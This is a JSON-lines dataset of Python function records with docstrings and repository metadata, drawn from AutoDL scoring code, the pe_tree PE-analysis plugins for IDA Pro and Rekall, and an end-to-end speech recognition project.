{"docstring": "''' Return the ranks (with base 1) of a list resolving ties by averaging.\n This works for numpy arrays.'''\n", "func_signal": "def tiedrank(a):\n", "code": "m = len(a)\n# Sort a in ascending order (sa=sorted vals, i=indices)\ni = a.argsort()\nsa = a[i]\n# Find unique values\nuval = np.unique(a)\n# Test whether there are ties\nR = np.arange(m, dtype=float) + 1  # Ranks with base 1\nif len(uval) != m:\n    # Average the ranks for the ties\n    oldval = sa[0]\n    newval = sa[0]\n    k0 = 0\n    for k in range(1, m):\n        newval = sa[k]\n        if newval == oldval:\n            # moving average\n            R[k0:k + 1] = R[k - 1] * (k - k0) / (k - k0 + 1) + R[k] / (k - k0 + 1)\n        else:\n            k0 = k;\n            oldval = newval\n# Invert the index\nS = np.empty(m)\nS[i] = R\nreturn S", "path": "AutoDL/AutoDL_sample_code_submission/Auto_Video/skeleton/projects/others.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "\"\"\"Set logging format to something like:\n     2019-04-25 12:52:51,924 INFO score.py: <message>\n\"\"\"\n", "func_signal": "def get_logger(verbosity_level):\n", "code": "logger = logging.getLogger(__file__)\nlogging_level = getattr(logging, verbosity_level)\nlogger.setLevel(logging_level)\nformatter = logging.Formatter(\n  fmt='%(asctime)s %(levelname)s %(filename)s: %(message)s')\nstdout_handler = logging.StreamHandler(sys.stdout)\nstdout_handler.setLevel(logging_level)\nstdout_handler.setFormatter(formatter)\nstderr_handler = logging.StreamHandler(sys.stderr)\nstderr_handler.setLevel(logging.WARNING)\nstderr_handler.setFormatter(formatter)\nlogger.addHandler(stdout_handler)\nlogger.addHandler(stderr_handler)\nlogger.propagate = False\nreturn logger", "path": "AutoDL/AutoDL_sample_code_submission/Auto_Tabular/model.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' 1 - Mean squared error divided by variance '''\n", "func_signal": "def r2_metric(solution, prediction, task='regression'):\n", "code": "mse = mvmean((solution - prediction) ** 2)\nvar = mvmean((solution - mvmean(solution)) ** 2)\nscore = 1 - mse / var\nreturn mvmean(score)", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Baseline log loss. For multiplr classes ot labels return the volues for each column'''\n", "func_signal": "def prior_log_loss(frac_pos, task='binary.classification'):\n", "code": "eps = 1e-15\nfrac_pos_ = sp.maximum(eps, frac_pos)\nif (task != 'multiclass.classification'):  # binary case\n    frac_neg = 1 - frac_pos\n    frac_neg_ = sp.maximum(eps, frac_neg)\n    pos_class_log_loss_ = - frac_pos * np.log(frac_pos_)\n    neg_class_log_loss_ = - frac_neg * np.log(frac_neg_)\n    base_log_loss = pos_class_log_loss_ + neg_class_log_loss_\n    # base_log_loss = mvmean(base_log_loss)\n    # print('binary {}'.format(base_log_loss))\n    # In the multilabel case, the right thing i to AVERAGE not sum\n    # We return all the scores so we can normalize correctly later on\nelse:  # multiclass case\n    fp = frac_pos_ / sum(frac_pos_)  # Need to renormalize the lines in multiclass case\n    # Only ONE label is 1 in the multiclass case active for each line\n    pos_class_log_loss_ = - frac_pos * np.log(fp)\n    base_log_loss = np.sum(pos_class_log_loss_)\nreturn base_log_loss", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Return the ranks (with base 1) of a list resolving ties by averaging.\n This works for numpy arrays.'''\n", "func_signal": "def tiedrank(a):\n", "code": "m = len(a)\n# Sort a in ascending order (sa=sorted vals, i=indices)\ni = a.argsort()\nsa = a[i]\n# Find unique values\nuval = np.unique(a)\n# Test whether there are ties\nR = np.arange(m, dtype=float) + 1  # Ranks with base 1\nif len(uval) != m:\n    # Average the ranks for the ties\n    oldval = sa[0]\n    newval = sa[0]\n    k0 = 0\n    for k in range(1, m):\n        newval = sa[k]\n        if newval == oldval:\n            # moving average\n            R[k0:k + 1] = R[k - 1] * (k - k0) / (k - k0 + 1) + R[k] / (k - k0 + 1)\n        else:\n            k0 = k;\n            oldval = newval\n# Invert the index\nS = np.empty(m)\nS[i] = R\nreturn S", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Python version and library versions '''\n", "func_signal": "def show_version(scoring_version):\n", "code": "swrite('\\n=== VERSIONS ===\\n\\n')\n# Scoring program version\nswrite(\"Scoring program version: \" + str(scoring_version) + \"\\n\\n\")\n# Python version\nswrite(\"Python version: \" + version + \"\\n\\n\")\n# Give information on the version installed\nswrite(\"Versions of libraries installed:\\n\")\nmap(swrite, sorted([\"%s==%s\\n\" % (i.key, i.version) for i in lib()]))", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "\"\"\"List a tree structure of directories and files from startpath\"\"\"\n", "func_signal": "def list_files(startpath):\n", "code": "for root, dirs, files in os.walk(startpath):\n    level = root.replace(startpath, '').count(os.sep)\n    indent = ' ' * 4 * (level)\n    logger.debug('{}{}/'.format(indent, os.path.basename(root)))\n    subindent = ' ' * 4 * (level + 1)\n    for f in files:\n        logger.debug('{}{}'.format(subindent, f))", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Write scores to file opened under file pointer fp'''\n", "func_signal": "def write_scores(fp, scores):\n", "code": "for key in scores.keys():\n    str_temp = \"%s --> %s\\n\" % (key, scores[key])\n    fp.write(str_temp.encode('utf-8'))\n    print(key + \" --> \" + str(scores[key]))", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "\"\"\"Infer the domain from the shape of the 4-D tensor.\"\"\"\n", "func_signal": "def infer_domain(self):\n", "code": "row_count, col_count = self.metadata.get_matrix_size(0)\nsequence_size = self.metadata.get_sequence_size()\nchannel_to_index_map = dict(self.metadata.get_channel_to_index_map())\ndomain = None\nif sequence_size == 1:\n  if row_count == 1 or col_count == 1:\n    domain = \"tabular\"\n  else:\n    domain = \"image\"\nelse:\n  if row_count == 1 and col_count == 1:\n    if channel_to_index_map:\n      domain = \"text\"\n    else:\n      domain = \"speech\"\n  else:\n    domain = \"video\"\nself.domain = domain\ntf.logging.info(\"The inferred domain of the dataset is: {}.\".format(domain))\nreturn domain", "path": "AutoDL/AutoDL_sample_code_submission/Auto_Tabular/model.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "\"\"\"Train this algorithm on the tensorflow |dataset|.\n\nThis method will be called REPEATEDLY during the whole training/predicting\nprocess. So your `train` method should be able to handle repeated calls and\nhopefully improve your model performance after each call.\n\n****************************************************************************\n****************************************************************************\nIMPORTANT: the loop of calling `train` and `test` will only run if\n    self.done_training = False\n  (the corresponding code can be found in ingestion.py, search\n  'M.done_training')\n  Otherwise, the loop will go on until the time budget is used up. Please\n  pay attention to set self.done_training = True when you think the model is\n  converged or when there is not enough time for next round of training.\n****************************************************************************\n****************************************************************************\n\nArgs:\n  dataset: a `tf.data.Dataset` object. Each of its examples is of the form\n        (example, labels)\n      where `example` is a dense 4-D Tensor of shape\n        (sequence_size, row_count, col_count, num_channels)\n      and `labels` is a 1-D Tensor of shape\n        (output_dim,).\n      Here `output_dim` represents number of classes of this\n      multilabel classification task.\n\n      IMPORTANT: some of the dimensions of `example` might be `None`,\n      which means the shape on this dimension might be variable. In this\n      case, some preprocessing technique should be applied in order to\n      feed the training of a neural network. For example, if an image\n      dataset has `example` of shape\n        (1, None, None, 3)\n      then the images in this datasets may have different sizes. On could\n      apply resizing, cropping or padding in order to have a fixed size\n      input tensor.\n\n  remaining_time_budget: time remaining to execute train(). The method\n      should keep track of its execution time to avoid exceeding its time\n      budget. If remaining_time_budget is None, no time budget is imposed.\n\"\"\"\n", "func_signal": "def train(self, dataset, remaining_time_budget=None):\n", "code": "self.train_loop_num += 1\nif self.pre_increament_preds:\n  self.X_train, self.Y_train = self.to_numpy_train(dataset)\n  self.X_train = pd.DataFrame(self.X_train)\n\nif not self.pre_increament_preds and self.train_loop_num > 50:\n  self.done_training = True", "path": "AutoDL/AutoDL_sample_code_submission/Auto_Tabular/model.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "\"\"\"Search for possible IDA Pro installations\"\"\"\n", "func_signal": "def find_ida():\n", "code": "if INSTALL_FOR_IDA:\n    paths = [\"/opt/ida-7.{}/plugins\",\n             \"~/.idapro/plugins\",\n             \"%ProgramFiles%\\\\IDA Pro 7.{}\\\\plugins\"]\n\n    found = []\n\n    for path in paths:\n        if \"{}\" in path:\n            for i in range(0, 10):\n                new_path = os.path.expandvars(path.format(i))\n\n                if os.path.exists(new_path):\n                    found.append(new_path)\n        else:\n            if os.path.exists(path):\n                found.append(path)\n\n    if len(found) > 0:\n        print(\"\\nTo complete the IDAPython plugin installation copy pe_tree_ida.py to:\\n{}\".format(\"\\n\".join(found)))", "path": "pe_tree/setup.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Jump to offset in IDA view\"\"\"\n", "func_signal": "def jumpto(self, item, offset):\n", "code": "try:\n    self.ret = idc.jumpto(offset)\nexcept:\n    self.ret = False\n\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Read dword from IDB\"\"\"\n", "func_signal": "def get_dword(self, offset):\n", "code": "self.ret = ida_bytes.get_dword(offset)\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Populate the tree view with DLLs\"\"\"\n", "func_signal": "def populate_dlls(self, parent, task):\n", "code": "task_as = task.get_process_address_space()\n\n# Determine architecture specifics\nif task.address_mode == \"AMD64\":\n    ptr_mask = 0xffffffffffffffff\n    ptr_width = 16\nelse:\n    ptr_mask = 0xffffffff\n    ptr_width = 8\n\n# Iterate over loaded modules (use ldrmodules plugin)\nfor module in session.plugins.ldrmodules(pids=[task.pid]):\n    if module.get(\"in_mem\") and module.get(\"base\") > 0:\n         # Ensure the image base is non-null and not the parent process\n        image_base = int(module.get(\"base\"))\n\n        if image_base == 0 or image_base == int(task.Peb.ImageBaseAddress):\n            continue\n\n         # Create internal filename\n        base_name = os.path.basename(utils.SmartUnicode(module.get(\"in_mem_path\")))\n        filename = \"{} ({} - {}) - 0x{:0x}\".format(utils.EscapeForFilesystem(base_name), task.name, task.pid, image_base)\n\n        # Create DLL tree view item\n        dll_item = QtGui.QStandardItem(\"{}\".format(utils.EscapeForFilesystem(base_name)))\n        dll_item.setData({\"filename\": filename, \"task\": task, \"address_space\": task_as, \"image_base\": image_base}, QtCore.Qt.UserRole)\n        dll_item.setCheckable(True)\n        dll_item.setCheckState(QtCore.Qt.Checked if parent.checkState() == QtCore.Qt.Checked else QtCore.Qt.Unchecked)\n        if parent.checkState() == QtCore.Qt.Checked:\n            self.items.add(HashableQStandardItem(dll_item))\n\n        parent.appendRow([dll_item, QtGui.QStandardItem(\"{}\".format(task.pid)), QtGui.QStandardItem(\"0x{:0{w}x}\".format(image_base & ptr_mask, w=ptr_width))])\n\nreturn\n\n# Iterate over loaded modules (via PEB in-order module list)\nfor module in task.get_load_modules():\n    process_offset = task_as.vtop(task.obj_offset)\n    if process_offset:\n        # Ensure the image base is non-null and not the parent process\n        image_base = int(module.DllBase) if int(module.DllBase) else 0\n\n        if image_base == 0 or image_base == int(task.Peb.ImageBaseAddress):\n            continue\n\n        # Create internal filename\n        base_name = os.path.basename(utils.SmartUnicode(module.BaseDllName))\n        filename = \"{} ({} - {}) - 0x{:0x}\".format(utils.EscapeForFilesystem(base_name), task.name, task.pid, int(module.DllBase))\n\n        # Create DLL tree view item\n        dll_item = QtGui.QStandardItem(\"{}\".format(utils.EscapeForFilesystem(base_name)))\n        dll_item.setData({\"filename\": filename, \"task\": task, \"address_space\": task_as, \"image_base\": image_base}, QtCore.Qt.UserRole)\n        dll_item.setCheckable(True)\n        dll_item.setCheckState(QtCore.Qt.Checked if parent.checkState() == QtCore.Qt.Checked else QtCore.Qt.Unchecked)\n        if parent.checkState() == QtCore.Qt.Checked:\n            self.items.add(HashableQStandardItem(dll_item))\n\n        parent.appendRow([dll_item, QtGui.QStandardItem(\"{}\".format(task.pid)), QtGui.QStandardItem(\"0x{:0{w}x}\".format(image_base & ptr_mask, w=ptr_width))])", "path": "pe_tree/pe_tree_rekall.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Create a qword at the given offset in the IDB\"\"\"\n", "func_signal": "def make_qword(self, offset):\n", "code": "self.ret = idaapi.create_qword(offset, 8)\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Get module/symbol name for address\"\"\"\n", "func_signal": "def resolve_address(self, offset):\n", "code": "symbol = self.get_name(offset)\nmodule = self.get_segment_name(offset)\n\nif not module and  \"_\" in symbol:\n    # No module name for the segment, try to determine from the symbol name\n    symbol_split = symbol.split(\"_\")\n\n    # Given a symbol, i.e. ws2_32_WSAStartup, can we find ws2_32.dll in the list of segments?\n    for segment in idautils.Segments():\n        segment_name = idc.get_segm_name(segment).lower()\n\n        if segment_name.startswith(symbol_split[0].lower()):\n            new_name = \"\"\n            for i in range(0, len(symbol_split)):\n                new_name = \"{}.dll\".format(\"_\".join(names[0:i]))\n                if new_name == segment_name:\n                    break\n\n            if new_name == segment_name:\n                module = new_name\n                break\n\n# Still nothing?!\nif not module and  \"_\" in symbol:\n    symbol_split = symbol.split(\"_\")\n\n    j = 1\n    if symbol_split[0] == \"ws2\":\n        j += 1\n        module = \"{}.dll\".format(\"_\".join(symbol_split[0:j]))\n    else:\n        module = \"{}.dll\".format(symbol_split[0])\n\n# Strip module name from symbol name\nif module:\n    module_name = module.split(\".\")[0].lower()\n\n    if symbol[:len(module_name)].lower().startswith(module_name):\n        symbol = symbol[len(module_name) + 1:]\n\nif not symbol:\n    symbol = \"{:x}\".format(offset)\n\nself.ret = (module, symbol)\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Name the given offset in the IDB\"\"\"\n", "func_signal": "def make_name(self, offset, name, flags=0):\n", "code": "self.ret = idc.set_name(offset, str(name), idc.SN_NOCHECK | idc.SN_NOWARN | 0x800)\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Create a new section in the IDB\"\"\"\n", "func_signal": "def make_segment(self, offset, size, class_name=\"DATA\", name=\"pe_map\", data=None):\n", "code": "idc.AddSeg(offset, offset + size, 0, 1, 0, idaapi.scPub)\nidc.RenameSeg(offset, str(name))\nidc.SetSegClass(offset, str(class_name))\n#idc.SegAlign(offset, idc.saRelPara)\nif data:\n    idaapi.patch_many_bytes(offset, bytes(data))\n\nself.ret = None\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Create a word at the given offset in the IDB\"\"\"\n", "func_signal": "def make_word(self, offset):\n", "code": "self.ret = idaapi.create_word(offset, 2)\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "# Get form and widget\n", "func_signal": "def run(self, arg):\n", "code": "form = idaapi.create_empty_widget(self.comment)\nwidget = sip.wrapinstance(int(form), QtWidgets.QWidget)\n\nruntime = IDARuntime(form)\n\n# Try to find the IDA input file\nfilename = idaapi.get_input_file_path()\n\nif not filename:\n    return\n\nif not os.path.isfile(filename):\n    filename = os.path.basename(filename)\n\n    if not os.path.isfile(filename):\n        filename = runtime.ask_file(os.path.basename(filename), \"Where is the input file?\")\n\nif not filename:\n    return\n\n# Map input file\nself.pe_tree_form = pe_tree.form.PETreeForm(widget, None, runtime)\nself.pe_tree_form.map_pe(image_base=idaapi.get_imagebase(), filename=filename)\nself.pe_tree_form.show()", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Determine if memory address is writable\"\"\"\n", "func_signal": "def is_writable(self, offset):\n", "code": "self.ret = False\n\ntask = self.opaque[\"task\"]\nif task is not None:\n    self.cc.SwitchProcessContext(task)\n\n    # Traverse VADs\n    for vad in task.RealVadRoot.traverse():\n        # Is address within the VAD region?\n        if vad.Start <= offset <= vad.End:\n            # Is the VAD region writable?\n            if \"WRITE\" in str(vad.u.VadFlags.ProtectionEnum):\n                self.ret = True\n\nreturn self.ret", "path": "pe_tree/pe_tree_rekall.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Find all likely IAT pointers\"\"\"\n", "func_signal": "def find_iat_ptrs(self, pe, image_base, size, get_word):\n", "code": "iat_ptrs = []\n\nnext_offset = image_base\n\nwhile next_offset < image_base + size:\n    offset = next_offset\n    next_offset = ida_bytes.next_addr(offset)\n\n    # Attempt to read the current instruction's effective memory address operand (if present)\n    mnem = idc.print_insn_mnem(offset).lower()\n    ptr = 0\n\n    if mnem in [\"call\", \"push\", \"jmp\"]:\n        if idc.get_operand_type(offset, 0) == idc.o_mem:\n            # Get memory offset for branch instructions\n            ptr = idc.get_operand_value(offset, 0)\n    elif mnem in [\"mov\", \"lea\"]:\n        if idc.get_operand_type(offset, 0) == idc.o_reg and idc.get_operand_type(offset, 1) == idc.o_mem:\n            # Get memory offset for mov/lea instructions\n            ptr = idc.get_operand_value(offset, 1)\n\n    # Does the instruction's memory address operand seem somewhat valid?!\n    if ptr < 0x1000:\n        continue\n\n    # Resolve pointer from memory operand\n    iat_offset = get_word(ptr)\n\n    # Ignore offset if it is in our image\n    if image_base <= iat_offset <= image_base + size:\n        continue\n\n    # Get module and API name for offset\n    module, api = self.resolve_address(iat_offset)\n\n    # Ignore the offset if it is in a debug segment or stack etc\n    if api and module and module.endswith(\".dll\"):\n        if not iat_offset in iat_ptrs:\n            # Add IAT offset, address to patch, module name and API name to list\n            iat_ptrs.append((iat_offset, offset + idc.get_item_size(offset) - 4, module, api))\n\nself.ret = iat_ptrs\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Read bytes from IDB\"\"\"\n", "func_signal": "def get_bytes(self, start, end):\n", "code": "self.ret = idc.get_bytes(start, end)\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Disassemble using capstone\"\"\"\n", "func_signal": "def jumpto(self, item, offset):\n", "code": "if item.tree.disasm:\n    for i in item.tree.disasm.disasm(item.get_data(size=0x100), offset):\n        item.tree.form.runtime.log(\"0x{:x}:\\t{}\\t{}\".format(i.address, i.mnemonic, i.op_str))\n\nself.ret = True\nreturn self.ret", "path": "pe_tree/pe_tree_rekall.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Read byte from IDB\"\"\"\n", "func_signal": "def get_byte(self, offset):\n", "code": "self.ret = ida_bytes.get_byte(offset)\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "# Load configuration\n", "func_signal": "def __init__(self, widget):\n", "code": "self.config_file = os.path.join(self.get_temp_dir(), \"pe_tree.ini\")\nsuper(IDARuntime, self).__init__(widget)", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Convert range to byte string in IDB\"\"\"\n", "func_signal": "def make_string(self, offset, size):\n", "code": "self.ret = idc.create_strlit(offset, offset + size)\nreturn self.ret", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Record selected items in the tree view\"\"\"\n", "func_signal": "def item_changed(self, item):\n", "code": "if item.checkState() == QtCore.Qt.PartiallyChecked:\n    # Add to list of selected items\n    self.items.add(HashableQStandardItem(item))\n\n    # If parent item then unselect all children\n    if item.hasChildren():\n        for row in range(0, item.rowCount()):\n            child = item.child(row)\n            child.setCheckState(QtCore.Qt.Unchecked)\n            self.items.discard(HashableQStandardItem(child))\n\nelif item.checkState() == QtCore.Qt.Checked:\n    # Add to list of selected items\n    self.items.add(HashableQStandardItem(item))\n\n    # If parent item then select all children\n    if item.hasChildren():\n        for row in range(0, item.rowCount()):\n            child = item.child(row)\n            child.setCheckState(QtCore.Qt.Checked)\n            self.items.add(HashableQStandardItem(child))\n\n    elif item.parent() is None:\n        # Expand the root item\n        self.treeview.setExpanded(item.index(), True)\n\nelif item.checkState() == QtCore.Qt.Unchecked:\n    # Remove from list of selected items\n    self.items.discard(HashableQStandardItem(item))\n\n    # If parent item then unselect all children\n    if item.hasChildren():\n        for row in range(0, item.rowCount()):\n            child = item.child(row)\n            child.setCheckState(QtCore.Qt.Unchecked)\n            self.items.discard(HashableQStandardItem(child))", "path": "pe_tree/pe_tree_rekall.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "# Wait for plugin threads to complete\n", "func_signal": "def term(self):\n", "code": "if self.pe_tree_form:\n    self.pe_tree_form.wait_for_threads()", "path": "pe_tree/pe_tree_ida.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "\"\"\"Append log message to the output view\"\"\"\n", "func_signal": "def log(self, output):\n", "code": "output_view = self.pe_tree_form.output_stack.currentWidget()\nif output_view:\n    output_view.append(output)\n    output_view.moveCursor(QtGui.QTextCursor.End)\n\nself.ret = True\nreturn self.ret", "path": "pe_tree/pe_tree_rekall.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "blackberry/pe_tree", "stars": 1284, "license": "apache-2.0", "language": "python", "size": 713}
{"docstring": "'''' \nCkpt saver\n    f_name - <str> the name phnof ckpt file (w/o prefix) to store, overwrite if existed\n    score  - <float> The value of metric used to evaluate model\n'''\n", "func_signal": "def save_checkpoint(self, f_name, metric, score, show_msg=True):\n", "code": "ckpt_path = os.path.join(self.ckpdir, f_name)\nfull_dict = {\n    \"model\": self.model.state_dict(),\n    \"optimizer\": self.optimizer.get_opt_state_dict(),\n    \"global_step\": self.step,\n    metric: score\n}\n# Additional modules to save\n# if self.amp:\n#    full_dict['amp'] = self.amp_lib.state_dict()\nif self.emb_decoder is not None:\n    full_dict['emb_decoder'] = self.emb_decoder.state_dict()\n\ntorch.save(full_dict, ckpt_path)\nif show_msg:\n    self.verbose(\"Saved checkpoint (step = {}, {} = {:.2f}) and status @ {}\".\n                 format(human_format(self.step), metric, score, ckpt_path))", "path": "End-to-end-ASR-Pytorch/src/solver.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "# Match embedding dim.\n", "func_signal": "def forward(self, dec_state, dec_logit, label=None, return_loss=True):\n", "code": "log_fused_prob = None\nloss = None\n\n#x_emb = nn.functional.normalize(self.emb_net(dec_state),dim=-1)\nif self.apply_dropout:\n    dec_state = self.dropout(dec_state)\nx_emb = self.emb_net(dec_state)\n\nif return_loss:\n    # Compute embedding loss\n    b, t = label.shape\n    # Retrieve embedding\n    if self.use_bert:\n        with torch.no_grad():\n            y_emb = self.emb_table(label).contiguous()\n    else:\n        y_emb = self.emb_table(label)\n    # Regression loss on embedding\n    if self.distance == 'CosEmb':\n        loss = self.measurement(\n            x_emb.view(-1, self.dim), y_emb.view(-1, self.dim), torch.ones(1).to(dec_state.device))\n    else:\n        loss = self.measurement(\n            x_emb.view(-1, self.dim), y_emb.view(-1, self.dim))\n    loss = loss.view(b, t)\n    # Mask out padding\n    loss = torch.where(label != 0, loss, torch.zeros_like(loss))\n    loss = torch.mean(loss.sum(dim=-1) /\n                      (label != 0).sum(dim=-1).float())\n\nif self.apply_fuse:\n    log_fused_prob = self.fuse_prob(x_emb, dec_logit)\n\nreturn loss, log_fused_prob", "path": "End-to-end-ASR-Pytorch/src/plugin.py", "commit_date": "2019-10-29 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "''' Takes context and decoder logit to perform word embedding fusion '''\n# Compute distribution for dec/emb\n", "func_signal": "def fuse_prob(self, x_emb, dec_logit):\n", "code": "if self.fuse_normalize:\n    emb_logit = nn.functional.linear(nn.functional.normalize(x_emb, dim=-1),\n                                     nn.functional.normalize(self.emb_table.weight, dim=-1))\nelse:\n    emb_logit = nn.functional.linear(x_emb, self.emb_table.weight)\nemb_prob = (nn.functional.relu(self.temp)*emb_logit).softmax(dim=-1)\ndec_prob = dec_logit.softmax(dim=-1)\n# Mix distribution\nif self.fuse_learnable:\n    fused_prob = (1-torch.sigmoid(self.fuse_lambda))*dec_prob +\\\n        torch.sigmoid(self.fuse_lambda)*emb_prob\nelse:\n    fused_prob = (1-self.fuse_lambda)*dec_prob + \\\n        self.fuse_lambda*emb_prob\n# Log-prob\nlog_fused_prob = (fused_prob+self.eps).log()\n\nreturn log_fused_prob", "path": "End-to-end-ASR-Pytorch/src/plugin.py", "commit_date": "2019-10-29 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "# Always strip trailing space, \\r and \\n\n", "func_signal": "def encode(self, s):\n", "code": "s = s.strip(\"\\r\\n \")\n# Space as the delimiter between words\nwords = s.split(\" \")\n# Manually append eos to the end\nreturn [self.vocab_to_idx(v) for v in words] + [self.eos_idx]", "path": "End-to-end-ASR-Pytorch/src/text.py", "commit_date": "2020-01-31 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "# Fetch data : move data/model to device\n", "func_signal": "def beam_decode(data, model, device):\n", "code": "name, feat, feat_len, txt = data\nfeat = feat.to(device)\nfeat_len = feat_len.to(device)\ntxt = txt.to(device)\ntxt_len = torch.sum(txt != 0, dim=-1)\nmodel = model.to(device)\n# Decode\nwith torch.no_grad():\n    hyps = model(feat, feat_len)\n\nhyp_seqs = [hyp.outIndex for hyp in hyps]\ndel hyps\nreturn (name[0], hyp_seqs, txt[0].cpu().tolist())  # Note: bs == 1", "path": "End-to-end-ASR-Pytorch/bin/test_asr.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
